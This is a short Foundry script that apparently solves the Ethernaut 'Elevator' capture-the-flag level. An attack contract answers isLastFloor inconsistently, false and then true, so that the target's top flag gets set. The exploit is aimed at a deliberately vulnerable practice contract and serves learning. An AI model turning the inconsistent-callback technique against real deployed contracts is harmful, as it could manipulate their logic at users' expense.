// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "../src/11_Elevator.sol";
import {Script, console} from "forge-std/Script.sol";

contract ElevatorSolve is Script {
    Elevator elevator = Elevator(0x3E06065209456D48C8E5FfB9827005B4501F775c);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before#", elevator.top());
        new Attack().pwn();
        console.log("After#", elevator.top());

        vm.stopBroadcast();
    }
}

contract Attack {
    uint256 flag;
    Elevator elevator = Elevator(0x3E06065209456D48C8E5FfB9827005B4501F775c);

    function pwn() external {
        elevator.goTo(flag);
    }

    function isLastFloor(uint256 floor) external returns (bool) {
        if (flag == 0) {
            flag = 1;
            return false;
        } else {
            flag = 0;
            return true;
        }
    }
}
